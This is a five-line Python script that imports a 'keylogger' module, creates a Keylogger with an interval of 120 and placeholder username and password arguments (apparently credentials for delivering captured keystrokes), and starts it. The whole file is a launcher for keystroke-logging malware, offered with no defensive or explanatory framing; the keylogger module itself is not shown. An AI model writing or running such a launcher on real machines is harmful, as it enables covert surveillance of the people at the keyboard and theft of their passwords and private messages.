#!/usr/bin/env python
import keylogger

my_keylogger = keylogger.Keylogger(120, 'username', 'password')
my_keylogger.start()